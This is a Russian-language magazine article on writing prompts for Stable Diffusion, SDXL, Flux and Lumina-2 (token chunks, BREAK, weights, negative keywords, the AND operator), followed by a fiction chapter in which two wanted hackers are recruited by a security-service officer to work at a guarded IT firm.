  В качестве примера приведу иллюстрацию, которую модель Flux выдала
с первой или второй попытки.





В качестве запроса использовался текст, сгенерированный ChatGPT:

         Title: Display the  title "The Crazy Adventure of the Kung-Fu Chicken"
        in bold and playful text at the top or center of the poster.«
         Main Character: Depict a dynamic and charismatic ninja chicken in a
       heroic karate pose, wearing a traditional karate outfit, while  still showing
       chicken features like feathers and a beak.
         Background: Include a colorful and exciting backdrop with elements like
      a mystical forest, a bustling city, and an ancient temple to hint at various
       adventures. The background is vibrant and engaging.
         Supporting Characters: Add a few quirky and fun supporting characters
      such as a wise old turtle, a mischievous squirrel sidekick, and a villainous
        fox.
          Pixar Branding: Incorporate the Pixar logo at the bottom or top of the
       poster to establish it as an official Pixar movie.
          Tagline:  Include  a  tagline  that  reads:  "A  Kung-Fu  Adventure"
       prominently on the poster.
           Visual  Style: Ensure the  overall  visual  style  is consistent with Pixar
       signature animation look: bright colors, expressive characters, and a touch
       of whimsy.                »
Вероятно, похожий результат можно было бы получить и более коротким зап‐
росом, но после нескольких попыток я предпочел пойти простым путем.
   Другая современная модель, Lumina-2, в качестве текстового декодера
использует полноценный LLM Gemma 2 2B. В документации рекомендуется
использовать запросы, сформированные следующим образом:


You are an assistant designed to generate superior images with the
superior degree of image-text alignment based on textual prompts or
user prompts. <Prompt Start>

На практике работают и более интересные запросы. Например, запрос «You
are a Chinese painter. Mixing oil paint and watercolor, draw a painting of a tranquil
Chinese village, with white houses overlooking a river channel, and a boat floating
along the river» выдаст примерно такую картинку.





Однако вернемся к созданию афиши. В случае с SDXL подобный запрос не то
чтобы совсем не сработает, но не сработает так, как надо. Для начала при‐
дется отказаться от надписей: любые попытки сгенерировать когерентный
текст длиннее одного‑двух слов в моделях SDXL обречены на провал. То же
касается логотипа Pixar: мне не удалось добиться его достаточной убе‐
дительности. В результате останется куда более простой запрос:

      Main Character: Depict a dynamic and charismatic ninja chicken  in a
       heroic karate pose, wearing a traditional karate outfit, while  still showing«
       chicken features like feathers and a beak.
         Background: Include a colorful and exciting backdrop with elements like
      a mystical forest, a bustling city, and an ancient temple to hint at various
       adventures. The background is vibrant and engaging.
         Supporting Characters: Add a few quirky and fun supporting characters
      such as a wise old turtle, a mischievous squirrel sidekick, and a villainous
        fox.
           Visual  Style: Ensure the  overall  visual  style  is consistent with Pixar
       signature animation look: bright colors, expressive characters, and a touch
       of whimsy.                »
Попробуем сгенерировать картинку. После нескольких откровенно неудачных
попыток получилось... нечто.





Персонаж объединяет в себе черты главного и второстепенных героев, при‐
чем второстепенных на картинке нет вообще. Почему так? Здесь мы подошли
к концепции context bleeding, «утечки контекста»: модель не в состоянии
однозначно атрибутировать заданные свойства конкретному объекту в кадре.
   Проблема  усугубляется тем, что наш запрос состоит из 131 токена
(токенами считаются любые слова, включая артикли и предлоги), а текстовые
декодеры SDXL ограничены 75 токенами. Соответственно, система разобьет
наш запрос на две очереди: в первой очереди будут первые 75 токенов,
во второй — то, что останется. Интерфейс WebUI подсчитывает количество
токенов автоматически.





Первая цифра здесь — число токенов в запросе, вторая — число токенов
с выравниванием по 75. На скриншоте выше видно, что запрос состоит
из 131 токена, которые будут разбиты на две очереди по 75 токенов каждая.
   Решить  проблему  можно  несколькими  способами.  Существуют  рас‐
ширения — например, Regional Prompter или Forge Couple, позволяющие раз‐
делить внимание модели по регионам. Эти расширения интересны, но их
рассмотрение выходит за рамки этой статьи; сегодня мы будем говорить
о том, как решить проблему, оставаясь в рамках текстового запроса. Один
из вариантов — разбить запрос на несколько очередей оператором BREAK.


ОПЕРАТОР BREAK

В интерфейсе WebUI A1111 и его производных (WebUI Forge и reForge) дос‐
тупен оператор BREAK. Его использование сигнализирует о разрыве в оче‐
реди токенов (я не смог подобрать лучшего перевода термину chunk, поэтому
пусть будет «очередь»). Вставив оператор BREAK перед каждым переводом
строки, мы получим следующий запрос.





Обрати внимание: очередей запросов стало не две, а четыре.





Результат более убедительный: несмотря на то что второстепенные пер‐
сонажи все так же отсутствуют, главный персонаж выглядит так, как дол‐
жен, — и продолжает выглядеть так же в последующих генерациях. Тем
не менее признаем, что сгенерированные LLM запросы, вероятно, не слиш‐
ком хорошо подходят моделям с архитектурой SDXL.
   Почему так происходит? Дело в том, что в Stable Diffusion XL и Flux при‐
меняются разные текстовые декодеры.
   Flux использует пару декодеров: CLIP-L (простой текстовый декодер, соз‐
данный в OpenAI) и T5 (локальная языковая модель, LLM, разработанная
Google). Использование полноценной, хоть и простой языковой модели
T5 позволяет составлять заметно более сложные и длинные запросы естес‐
твенным языком, в то время как CLIP-L помогает выделять и декодировать
отдельные ключевые слова. Иначе говоря, CLIP-L лучше всего работает
с короткими ключевыми словами, перечисленными через запятую, в то время
как T5 обрабатывает весь запрос целиком.
   T5 — тяжелая модель; она требует и заметных вычислительных ресурсов,
и достаточно большого объема памяти. В архитектуре SDXL, разработчики
которой ориентировались на актуальные в 2023 году потребительские виде‐
окарты, вместо нее используется другой декодер: CLIP-G. Получается, что
в моделях SDXL совместно работает пара декодеров CLIP-L (короткие зап‐
росы естественным языком и ключевые слова через запятую) и CLIP-G (слож‐
ные запросы естественным языком).
  В то же время CLIP-G — быстрая, но очень простая модель; ее воз‐
можности по сравнению с T5 заметно ограниченны. Для моделей SDXL опти‐
мальным будет запрос, составленный из комбинации несложных, не перег‐
руженных смыслом (и уж тем более — «мусором») предложений на естес‐
твенном языке в сочетании с ключевыми словами, перечисленными через
запятую. Для несложных композиций, в которых не предусмотрено взаимо‐
действие между объектами сцены, можно и вовсе ограничиться ключевыми
словами через запятую.
   Попробуем переформулировать запрос в рамках ограничений моделей
CLIP. В начале поставим указатель на стиль, далее перечислим персонажей,
затем детализируем внешний вид главного персонажа и, наконец, опишем
желаемый фон.

       Pixar animation style, a ninja chicken as a main character, a wise old
         turtle, a mischievous squirrel sidekick, a villainous fox BREAK«
         dynamic and charismatic ninja chicken in a heroic karate pose, wearing
      a traditional karate outfit BREAK
           vibrant and engaging background including colorful backdrop, mystical
        forest,  bustling  city,  ancient  temple,  to  hint  at  various  adventures,
       expressive characters, and a touch of whimsy                »





                                      Результат

В рамках архитектуры SDXL — вполне неплохо, однако второстепенные пер‐
сонажи так и не появились. Я испробовал несколько базовых моделей и даже
задрал параметр CFG до фантастических значений, но и это не помогло. Мак‐
симального (хоть и весьма условного) приближения удалось достичь, лишь
переформулировав первую очередь запроса следующим образом:

       Pixar animation style, a ninja chicken as a main character surrounded by
      a wise old  turtle, a mischievous squirrel sidekick, and a  villainous fox«
     BREAK                »





НЕГАТИВНЫЕ КЛЮЧЕВЫЕ СЛОВА

Во времена Stable Diffusion 1.5 были популярны так называемые «шизоидные»
запросы, когда строку негативных запросов заполняли мусорными токенами
вроде «шесть пальцев, кривые пальцы, деформированные пальцы, дефор‐
мированная анатомия».
   Камлание с бубном не работает; даже если на отдельно взятой картинке
с подобными  ключевиками вдруг  полный порядок, а на том же сиде
без негативных ключевиков наблюдается проблема, это вовсе не означает,
что магия  сработала. Просто генерация пошла немного другим путем,
и получилась другая картинка — по случайности без дефекта. Сгенерируй
сотню картинок, и ты убедишься, что процент дефектов примерно одинаков
что с негативными ключевыми словами, что без них.
   Проблему неверного числа пальцев на руках решают другими способами:
на этапе обучения или микширования модели, а также с помощью специали‐
зированных семплеров, режима  HiDiffusion с повышенным разрешением
и расширений класса ADetailer.
   Зачем тогда вообще негативные ключевые слова? Они нужны для того,
чтобы убрать из конкретной картинки нежелательный элемент или усилить
действие позитивных ключевых слов. Например, использование термина
monochrome  в  качестве  негативного  ключевого  слова может  поднять
насыщенность изображения, а перечисление тех или иных объектов — убрать
их из кадра. Иными словами, негативные ключевые слова — это еще один
инструмент для уточнения запроса.
   Разумеется, из этого правила есть исключения. Некоторые модели обу‐
чаются на изображениях разного качества, ведь для того, чтобы понять, что
такое «хорошо», модель должна понимать, что такое «плохо». В таких моделях
могут использоваться специальные теги (как позитивные, так и негативные)
для указания желаемого качества изображения. В то же время исполь‐
зование таких тегов может ограничить разнообразие результатов, ведь
выбор существенно сузится, если указать тег «шедевр» и заблокировать все
«плохое» и «посредственное». Я обычно стараюсь не использовать такие
теги, если это не ведет к существенной деградации качества картинки.


TL&DR: не используй случайные наборы негативных ключевых слов из чужих
картинок. Используй только те ключевые слова, которые помогают убрать
ненужное или усилить нужное для конкретного изображения. Также можно
использовать (а можно и не использовать!) специфические ключевые слова
для повышения  качества  генерации  у  конкретных моделей,  обученных
с использованием тегов качества.



ВЕСОВЫЕ КОЭФФИЦИЕНТЫ

Усилить или ослабить вес любого токена или набора токенов можно сле‐
дующим образом:


(токен или фраза:2)

Вместо двойки можно подставить любой весовой коэффициент, включая
дробные. Работают коэффициенты в диапазоне от нуля до разумной верхней
планки, которая зависит от конкретной модели. Как правило, имеет смысл
использовать небольшие коэффициенты в диапазоне от 0 до 2, но в некото‐
рых случаях допустимо использовать и большие величины.
   Использование конструкции (токен) равнозначно (токен:1.1), а ((
токен)) — то же самое, что и (токен:1.2).
   Также можно пользоваться квадратными скобками для снижения веса.
Например, если написать [токен], то это понизит весовой коэффициент взя‐
того в квадратные скобки термина в 1,1 раза. Однако круглые скобки и дроб‐
ный коэффициент и выглядят более понятно, и вводить их проще и быстрее:
достаточно выделить строку, вес которой нужно модифицировать, и регули‐
ровать вес комбинацией клавиш Ctrl-вверх и Ctrl-вниз (каждое нажатие кноп‐
ки «вверх» или «вниз» повысит или понизит коэффициент на 0,1).
   Весовые коэффициенты работают как в основном, так и в негативном зап‐
росе,  однако  использовать  можно  только  положительные  значения.
Для использования отрицательных весовых коэффициентов вида (токен:-1)
нужно устанавливать специальное расширение negpip для Comfy или для
WebUI.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

    КРУТЫЕ ЗАПРОСЫ
        КАК ПРАВИЛЬНО ПРОСИТЬ STABLE
        DIFFUSION НАРИСОВАТЬ КАРТИНКУ





КОТАПЕЛЬСИН ИЛИ АПЕЛЬСОКОТ?

В интерфейсе WebUI и его производных есть целый ряд продвинутых воз‐
можностей, связанных с синтаксисом запросов. Оператор BREAK мы уже рас‐
смотрели, им дело не ограничивается; разные дополнительные возможности
интерфейса описаны в Wiki A1111.
   Возьмем простую связку из кота и апельсина и попробуем сделать с этим
что‑то интересное, зафиксировав сид в значении 614462921.
   Вот так выглядит результат обработки запроса cat, orange.





Context bleeding во всей красе. А если написать cat and orange?





Вполне прилично; то, чего и хотелось.
  В WebUI есть интересная фича — можно комбинировать текстовые зап‐
росы, когда в начале генерации на вход подается одна строка, а в конце —
другая. Синтаксис запроса такой:


[текст в начале генерации:текст в конце генерации:когда_переключать]

К примеру, строка [cat:dog:0.7] указывает, что на ранних шагах будет
генерироваться кошка, на поздних — собака, а переключение между кошкой
и собакой произойдет на отметке 0.7 (то есть первые 70% шагов у нас будет
«кошка», а оставшиеся 30% шагов будет генерироваться «собака»). Пос‐
мотрим, как это работает на практике.
  Для начала сгенерируем кошку на белом фоне: cat, white background.





Теперь собаку: dog, white background.





А теперь — нечто среднее: [cat:dog:0.7], white background.





Другая возможность — чередование запросов: на нечетных шагах генерации
будет подаваться первая строка, а на четных — вторая. К примеру, таким
образом модель обработала запрос с поочередной подачей на вход «кошки»
и «апельсина».


[a cat|an orange]





На практике эту возможность можно использовать, например, для указания
прически, цвета волос или одежды, когда не устраивает ни один из стандар‐
тных вариантов и хочется разнообразия.


ТЕКСТОВЫЕ ИНВЕРСИИ

Здесь все просто: текстовые инверсии скачиваются и складываются в папку
Embeddings, после чего их можно просто указывать в текстовом запросе
как имя файла без расширения. Таким образом мы поможем модели «найти»
ту или иную концепцию.
   Текстовые инверсии можно использовать как в основной, так и в негатив‐
ной частях запроса. Обрати внимание: текстовые инверсии имеют ограниче‐
ния по совместимости. Они не просто подходят только к конкретной архитек‐
туре (SD1.5 или SDXL), но иногда предназначены для конкретных классов
моделей (общие модели SDXL, модели на базе Pony, модели на базе
Illustrious и так далее).
   Впрочем, тут кроется не только ограничение, но и возможность: иногда
текстовые инверсии от одного класса моделей можно использовать в другом.
Некоторые текстовые инверсии от Pony/Illustrious могут подойти к некоторым
моделям SDXL, причем это работает и в обратную сторону.
   Например, базовая модель Pony Diffusion имеет слабое представление
об устройстве газонокосилок разных типов. Пользователя Reddit заинтересо‐
вала конкретная модель газонокосилки Bobcat; он создал для нее текстовую
инверсию в базовой модели SDXL и продемонстрировал, что соответству‐
ющее изображение успешно генерируется в Pony. По его мнению, связано
это с тем, что при создании модели Pony произошло «выгорание» текстового
декодера в результате избыточного обучения.
   Соответствующая концепция пропала из CLIP, но «знание» об устройстве
подобных объектов осталось в UNet, унаследованной от базовой модели
SDXL. Использование текстовой инверсии позволило извлечь из UNet одну
из частей, которую невозможно было адресовать через обычный текстовый
запрос.
  От себя добавлю, что, несмотря на это, газонокосилка у Pony получилась
весьма схематичной и напоминала скорее модель, собранную из случайных
деталей детского конструктора, чем реальный объект.
   Какие бывают текстовые инверсии и как их искать? Для них есть соответс‐
твующий тег на Civit.ai. В качестве концепций часто предлагают те или иные
изобразительные стили (от фотореалистичного до концептуальных), пер‐
соналии (от публичных деятелей и актеров до просто оригинальных пер‐
сонажей), позы и действия.


COMPOSABLE DIFFUSION

Composable Diffusion — это метод, который помогает сочетать несколько
идей в одном изображении. Продемонстрировать концепцию «котапель‐
сина», как она описана в документации, оказалось сложнее. Тем не менее
запрос a cat AND an orange дал один «котапельсин» и один «котопельсин».





Механизм позволяет объединять разные образы, используя оператор AND.
Например, запрос a cat AND a dog выдаст животное, сочетающее в себе
черты кота и собаки. С оператором AND прекрасно работают описанные
ранее техники — от весовых коэффициентов до текстовых инверсий вклю‐
чительно. Так, если ты хочешь получить скорее кота, чем собаку, то весовой
коэффициент кота можно увеличить:


a cat:1.2 AND a dog

Для чего это нужно? При помощи оператора AND удобно смешивать художес‐
твенные стили:


cyberpunk style AND oil painting

Можно создавать уникальных, детализированных персонажей:


a frog AND yellow eyes AND horns

Наконец, с  оператором AND  можно  использовать  несколько  текстовых
инверсий. Попробуй, это отличный способ получить оригинальный результат,
которого не достичь или трудно достичь другими.


Шпаргалка по составлению запросов
Для разных архитектур (а иногда и классов моделей в рамках одной архитек‐
туры) используются разные способы построения текстовых запросов. В архи‐
тектурах, использующих в качестве текстовых декодеров большие языковые
модели, хорошо работают детальные запросы, составленные другими язы‐
ковыми моделями, например ChatGPT.
  В архитектурах попроще лучше работают короткие предложения и простая
терминология. У экзотических терминов эффект невелик, так как они редко
используются при описании изображений, на которых обучаются модели,
но в известных пределах это можно скомпенсировать повышением весового
коэффициента: (слово:2). Вес ключевого слова можно и понизить: (слово:
0.5); веса работают как в основной, так и в негативной части запроса.
  В моделях, обученных на изображениях из booru, используются запросы,
составленные из стандартных тегов danbooru. Модели на основе Pony прак‐
тически утратили возможность воспринимать запросы, составленные естес‐
твенным языком; в моделях на базе Illustrious (а точнее, NoobAI) эта воз‐
можность присутствует.
   Очередь запросов в SDXL формируется из последовательностей, содер‐
жащих до 75 токенов. Длинные запросы будут разбиты автоматически. Иног‐
да это происходит посреди предложения. Чтобы этого избежать, используй
оператор BREAK.
  Не стоит излишне увлекаться заимствованием запросов, особенно в их
негативной части. В негативном запросе стоит указывать только те элементы,
которых не должно быть на изображении, но которые модель все равно
генерирует. В некоторых случаях можно (но не всегда нужно) использовать
модификаторы качества.
   Иногда могут  оказаться полезными такие  функции,  как Composable
Diffusion (оператор AND) и условная генерация, когда разные текстовые зап‐
росы либо чередуются, либо подменяются на определенном этапе генера‐
ции.
GEEK





   Выспаться толком не удалось. Жесткая лавка не позволяла расслабить‐
ся — Кирилл боялся кувырнуться во сне на пол, да и в коридоре за дверью
было шумно, там постоянно звучали чьи‑то шаги и голоса. На рассвете дверь
отворилась, и на пороге показался бодрый румяный Алексей.
 — Идемте, — сказал он, — нас ждут.
   Кириллу вернули вещи, включая ноутбук и телефон, правда, последний
окончательно разрядился и не реагировал на попытки его включить. Алексей
учтиво открыл пассажирскую дверь синего «Форда», сам сел за руль,
и машина покатилась по шоссе, прочь от границы.
 — Куда едем? — сонно поинтересовался Кирилл, оглядывая проплыва‐
ющий за окном однообразный деревенский пейзаж.
 — Здесь недалеко, потерпите. Ваша подруга уже на месте, вас дожида‐
ется, — ответил его сопровождающий.
   Ехали и вправду недолго: Кирилл заметил дорожный указатель с надписью
«Кингисепп», и «Форд», свернув на узкую улочку, остановился у неприметного
здания, похожего на типовую одноэтажную школу. Алексей заглушил машину,
жестом пригласив Кирилла следовать за собой.
  Они миновали полутемный коридор, застеленный исшарканным линоле‐
умом. Алексей постучался в дверь без таблички и, не дожидаясь приг‐
лашения, потянул ее на себя, кивнув Кириллу — входи. За дверью оказался
просторный кабинет, обставленный довольно‑таки скромно: письменный
стол, три кресла, шкаф с бумагами. Судя по всему, это помещение исполь‐
зовалось нечасто, вид оно имело необжитой. В одном из кресел сидела уста‐
лая и явно не выспавшаяся Алла, на лице которой при появлении Кирилла
появилась улыбка и облегчение, хотя выглядела она совершенно разбитой.
А за столом обнаружился молодой, но уже лысеющий мужчина, встретивший
гостя внимательным и цепким взглядом. Постарше его самого, подумал Киря,
но еще не в том возрасте, который называют «средним».
 — А вот и наш великий хакер пожаловал, — поприветствовал его хозяин
кабинета. — Ну проходи, сейчас пиццу привезут, пировать будем. Меня зовут
Леонид. Впрочем, мы уже знакомы.
 — В таком случае, может, хотя бы вы мне объясните, за что конкретно и на
каком основании нас задержали? — не слишком приветливо обратился
к нему Кирилл: ночной недосып давал о себе знать.
 — Во‑первых, можно на ты, — не отреагировал на его подначку Леонид, —
а во‑вторых, я уже говорил тебе, что большие деньги влекут за собой боль‐
шие проблемы. Вот это они и есть.
 — Фреш? — изумленно уставился на него Киря.
 — Леонид Аркадьевич, но для тебя просто Лёня.
 — Ты… из полиции?
 — Из другой конторы, — усмехнулся тот, — но тоже на три буквы.
 — А как же…
 — Если ты о том, чем мы занимались пару лет назад, — перебил его
Фреш, — то далеко не все в юности были паиньками. Я вот тоже мечтал
о  свободе,  независимости и не хотел идти по родительским  стопам.
Но жизнь, как видишь, распорядилась иначе… Расставила, так сказать, свои
приоритеты.
   Принесли пиццу — несколько картонных коробок, от которых исходил
совершенно умопомрачительный аромат. Проголодавшийся Кирилл сразу
набросился на угощение, а заодно попросил себе кофе: проснуться толком
так и не получилось, и он надеялся хоть немного взбодриться и заставить
голову соображать.
 — В общем, даю расклад, — сказал Леонид, когда они немного насыти‐
лись. — Трикси я в двух словах ситуацию уже изложил, так что ей придется
послушать еще разок. Контора, серваки которой вы ломанули, работает
на подряде с американским правительством, поэтому там на уши встали бук‐
вально все, включая ФБР. Уж больно много секретов на тех серверах хра‐
нилось. Не знаю как, но они смогли восстановить логи и сдеанонили ваших
подельников и вас самих заодно, правда, времени на это ушло изрядно.
Выписали ордеры на арест, двоих уже задержали, включая Зеробайта.
 — Мы слышали об этом, — подала наконец голос Алла.
 — Тем более. Зеро командовал взломом, но главный инициатор, конечно,
не он, есть другие заинтересованные лица. Думаю, американцы очень скоро
вытянут по цепочке всех, они умеют добиваться результата, когда хотят. Лич‐
но для вас это означает следующее. Во‑первых, про заграницу можно забыть:
то, что обоих не задержали в Эстонии, — это просто фантастическое
везение. Видать, не врут анекдоты про быстроту реакции тамошних чинов‐
ников. Экстрадиция в Штаты ничем хорошим для вас не закончится: даже
если признаете вину и дадите показания, сидеть придется лет двадцать,
не меньше, а американские тюрьмы — это ни фига не курорт. И на адвокатов
потратите столько, что придется продать последнее. Но и в России на вас
заведено разыскное дело по запросу Европола, очень уж мечтают с вами
познакомиться заокеанские следователи. Короче, что тут, что там, спокойной
жизни вам теперь не дадут.
 — А если залечь на дно? — с надеждой спросил Кирилл, косясь на пос‐
ледний оставшийся кусок «Маргариты».
 — И как ты себе это представляешь? — усмехнулся Лёня. — Считай,
без документов, без постоянного жилья, без банковских карт? Ни билет
не купить, ни наличку в банкомате снять, чтобы твоя рожа в камеру не попала.
Ну и зарабатывать тоже как‑то надо. Ты ж не Ульянов‑Ленин, чтобы годами
жить на нелегальном положении… И партии большевиков, готовой тебя под‐
держивать, за спиной нет. В один прекрасный момент спалишься.
   Разумное зерно в словах Фреша, конечно, имелось. Да что там говорить,
целый амбар того самого зерна. Кирилл прекрасно понимал: вечное бегс‐
тво — не выход. Рано или поздно захочется остановиться, выдохнуть, почувс‐
твовать под ногами твердую землю, которая никуда не ускользнет.
  «И что дальше?» — подумал он с горечью. Кирилл задавал себе этот воп‐
рос и раньше, хотя нечасто заставлял себя смотреть правде в глаза. Будуще‐
го он не боялся, но отыскать ответ на этот проклятый вопрос все никак
не удавалось. Фреш прав: рано или поздно придется сделать выбор — либо
прятаться до бесконечности, либо остановиться и принять все как есть.
Но что значит «остановиться»? Вернуться? Куда, к кому? В прошлое, которого
больше нет? Это только кажется, что в любой момент можно взять и начать
все сначала, как будто человеческая жизнь — это податливая масса, готовая
принять любую форму. Но его жизнь уже затвердела, как прочный цемент,
и теперь каждый шаг — лишь новая трещина в этом застывшем монолите.
 — Есть какие‑то идеи? — спросил он без особой надежды.
 — Идеи есть, — охотно ответил Леонид, словно ждал этого вопроса, —
другое дело, готовы ли вы с Аллой их принять.
 — А конкретнее?
 — Работает в Питере одна контора, — пустился в объяснения Фреш. —
Не буду темнить: контору наша служба организовала, но внешне это самая
обычная айтишная фирма. Разве что с повышенным вниманием к дисципли‐
не: пропуска там обязательные, охрана, закрытая территория. Это вещь
необходимая, потому что трудятся там не только наемные специалисты, но и
те, кому реальный срок за всякие компьютерные непотребства светит. Если
человек с головой  дружит и дело  знает, мы  стараемся ему  отсидку
в какой‑нибудь колонии‑поселении на обязательные работы заменить: всяко
лучше за компом в приятном коллективе трудиться, чем рукавицы шить.
Но есть и простые сотрудники. Я вот хочу предложить вам обоим там порабо‐
тать, пока все не уляжется. С нас — жилье, питание, контракт, зарплата. Всё
как положено. С вас только согласие и подпись в документах.
 — А заниматься чем придется? — уточнила Алла.
 — Да тем же самым, чем и раньше занимались, — спокойно ответил
Фреш, глядя ей в глаза. — Будете хакерами на полном обеспечении. Только
никто вас потом за вашу деятельность в тюрьму не потащит, по крайней мере
в этой стране. Что скажете?
   Это звучало как шанс выбраться из тени и начать новую жизнь в отно‐
сительной безопасности. Стать кем‑то вроде охотника с лицензией — вро‐
де бы все останется как прежде, но можно будет не опасаться за последс‐
твия. Делай, что умеешь, и не оглядывайся. Но все‑таки, когда Кирилл думал
об этом, внутри начинал шевелиться червячок сомнения. Перед ним будто
открыли дверцу в клетку — просторную, удобную, но все же клетку, из которой
может и не оказаться выхода. Хищники, впрочем, живут в неволе, но нравится
ли им такая жизнь? С другой стороны, и на воле их век может оказаться
недолгим. Вот так оно и бывает: стоит дать обещание, и твоя судьба уже при‐
надлежит не только тебе.
   Кирилл посмотрел на Аллу, которая сидела молча, уставившись в пол.
Это предложение касалось и ее тоже, поэтому он ждал, что она ответит.
Не дождался.
 — Мы можем подумать? — решил потянуть время он.
 — Можете. Минут пятнадцать, как раз успеешь допить свой кофе.
   Что ж, он рассчитывал на большее, но расчет не оправдался. Придется
принимать решение прямо сейчас. Если  откажется,  их, наверное, даже
отпустят на все четыре стороны, только далеко ли получится уйти?
 — У меня есть условие, — решительно произнес Кирилл. — Со мной будет
работать еще один человек.
 — Интересно, кто же? — поднял бровь Леонид.
 — Санчо.
  В комнате повисла тишина: Фреш пристально смотрел на него с легким
прищуром, сцепив перед собой пальцы в замок, словно увидел Кирилла
впервые только секунду назад и сейчас внимательно изучал его.
 — И чем он может быть полезен? Санчо кардер, к тому же давно отошел
от дел.
 — У него прекрасные аналитические способности. Он умеет собирать
и систематизировать информацию, в разведке ему нет равных.
 — Своих не бросаем, да? — усмехнулся Леонид. — Это будет непросто,
Кикс. Твой Санчо под уголовной статьей ходит, к тому же не за компьютерные
преступления. У него двести двадцать восьмая, если не путаю.
 — Я знаю. И тем не менее, я уверен, ты сумеешь его вытащить.
 — Значит, если смогу выполнить твое условие, ты согласен со мной
работать?
 — Да, считай, что договорились.





Кирилл вновь посмотрел на Аллу, но та, как и прежде, хранила молчание.
Да что, черт возьми, с ней происходит?





Несмотря на свою мрачную репутацию города вечных ветров и дождей, Питер
встретил их ясным небом и солнечной погодой. Леонид повел машину через
центр, комментируя открывающиеся за окном виды. Серый гранит набереж‐
ных, широкие проспекты и старинные дворцы буквально завораживали стро‐
гой красотой, которой дышало каждое здание. Привыкший к пыльным улочкам
своего района, Кирилл ощутил странное волнение, будто его перенесли
в другой мир. «Красивая ловушка», — невольно подумал он, вглядываясь
в отражение золотистого шпиля Петропавловки в черной невской воде.





Бежевая тридцать первая «Волга» притормозила на набережной канала, про‐
тянувшегося от центра почти до края города. Вокруг раскинулся индустриаль‐
ный пейзаж — высокие трубы мертвых заводов, бесконечные кирпичные про‐
изводственные и  складские  корпуса,  каменные  заборы,  вытянувшиеся
в линию над холодной водой. Людей здесь гуляло совсем немного, праздным
прохожим и туристам нечего было тут делать. Район казался вымершим,
словно его жители пали жертвой какой‑то неведомой эпидемии.
   Машина подкатила к массивным железным воротам, Леонид предъявил
вышедшему навстречу охраннику пропуск, после чего ворота со скрежетом
разъехались в стороны. За ними открылись еще одни: автомобиль вни‐
мательно осмотрел другой человек в черной форме с нашивкой Security
на спине, заглянул в салон, прошелся вокруг с зеркалом на длинной палке,
позволявшим  увидеть,  что  творится  под  днищем.  Удовлетворившись
осмотром, он махнул рукой.
 — Серьезно у вас тут, — впечатлился такой встречей Кирилл.
 — Безопасность превыше всего, — хмыкнул в ответ Леонид.
 — Надписи «Труд делает свободным» над воротами не хватает, — съязвил
Киря.
 — Не успели повесить. Только колючку пока что натянули.
   Колючая проволока поверх трехметрового забора и вправду присутство‐
вала, как и видеокамеры, внимательно просматривавшие каждую пядь ого‐
роженного периметра. Разве что вышек с автоматчиками не хватает…
 — Это чтобы недобрые люди через забор не лазили, — проследив за его
взглядом, пояснил Фреш.
 — Сюда или отсюда?
 — В обоих направлениях. Приехали, пойдем.
   Перед Кириллом предстало мрачноватое трехэтажное кирпичное здание,
построенное, вероятно, еще пару веков назад. Когда‑то тут тоже располага‐
лась мануфактура, а сейчас бывшие производственные корпуса представ‐
ляли собой  конгломерат  офисов,  соединенных длинными полутемными
переходами. Тот корпус, в который Фреш привел Кирилла и Аллу, стоял обо‐
собленно, имел собственный внутренний дворик с оборудованной курилкой
под навесом и собственный же охраняемый вход с КПП и воротами, через
которые они сюда въехали.
   Леонид показал им помещения, расположенные на двух этажах: несколько
переговорок, опрятные уборные, столовая, в которой сотрудников обещали
бесплатно кормить трижды в день. Анфилада комнат, разгороженных стек‐
лянными перегородками на секции, — обычный «опен спейс», ради пущего
уюта украшенный живыми пальмами в кадках. Имелась даже комната отдыха
с мягкими кожаными диванами и массажными креслами, а рядом с ней обна‐
ружились две кофе‑машины, пользоваться которыми, по словам Леонида,
можно без ограничений. Кирилл обратил внимание на обилие видеокамер,
которые были натыканы буквально повсюду: они висели в коридорах, в сто‐
ловой, по одному объективу смотрело в монитор сотрудника на каждом
рабочем месте. Очутившись в этих стенах, ты всегда оставался под неусып‐
ным наблюдением. Куда передавался сигнал с камер, Киря не знал: веро‐
ятно, где‑то имелся специально оборудованный пост охраны.
  В офисную часть можно было зайти, приложив к считывателю пластиковую
карту‑пропуск, она же ограничивала доступ в административную часть зда‐
ния, попасть в которую без приглашения попросту невозможно. Кроме того,
пропуск открывал проход в коридор, ведущий в жилой сектор — здесь рас‐
полагалось что‑то вроде хостела для сотрудников, не имеющих своего угла,
и тех, на чье свободное перемещение накладывались судебные ограничения.
   Тут его встретил узкий коридор без окон, зато с репродукциями морских
пейзажей в простых пластиковых рамках, в самом начале — комнатка консь‐
ержки, где можно попросить утюг и гладильную доску. Сами комнатки неболь‐
шие, на две кровати: пара тумбочек, встроенный шкаф, телевизор, крошеч‐
ный холодильник, за дверцей — умывальник с унитазом. А вот душ — общий,
в противоположном от консьержки конце коридора. В целом — уютненько.
Не пять звезд, конечно, но терпимо. Кирилл выглянул в окно: за ним откры‐
вался все тот же промышленный пейзаж — серые скаты жестяных крыш,
заводские трубы, ажурные стрелы кранов, лишь где‑то вдалеке золотится
шпиль Адмиралтейства. Леонид любезно предложил Кириллу пожить в одной
из свободных комнат, сообщив мимоходом, что Аллу поселят на другом эта‐
же: нравы в этом общежитии царили пуританские. Вопрос с кормежкой он
тоже твердо пообещал решить, даже несмотря на то, что Кирилл покамест
никаких договоров не подписывал. Что ж, побудет тут на правах  гостя,
осмотрится.





Когда за Леонидом и Аллой захлопнулась дверь, Кирилл устало опустился
на кровать и закрыл глаза. Слабость после болезни и выматывающая сумато‐
ха последних нескольких дней давали о себе знать. Соседа по комнате у него
пока еще не было, потому он мог чувствовать себя здесь полноправным хозя‐
ином.  Нужно  воспользоваться  возможностью и  хорошенько  отдохнуть,
подумал он.
   Кирилл ожидал, что, приняв предложение Фреша, почувствует облегчение,
но этого не произошло. Откуда‑то из глубины души поднялось странное чувс‐
тво, словно он больше не принадлежал самому себе. Вроде бы никто не зас‐
тавлял его ничего менять в собственной жизни — он все еще мог уйти, прос‐
то встать, покинуть это здание и больше не возвращаться. Но он понимал, что
не сможет так поступить. Не сможет оставить тут Аллу, не сможет сбежать,
не попытавшись вытащить Санчо, не поговорив с Фрешем, который уже
не раз приходил ему на помощь. В какой‑то миг ему показалось, что на его
руках и ногах выросли цепи, невидимые, но при этом ужасно прочные.
GEEK





 — Да в целом хреново дела, бро, — по привычке шмыгнув носом, приз‐
нался Санчо и затравленно оглянулся. — Бизнес отжали, все бабки на адво‐
катов ушли, а толку от них никакого, разговоры одни. Наобещали вагон
и маленькую тележку, но ни фига не сделали. Да и вещества те мне в машину
шлюха подбросила, я из‑за нее чуть надолго на нары не заехал…
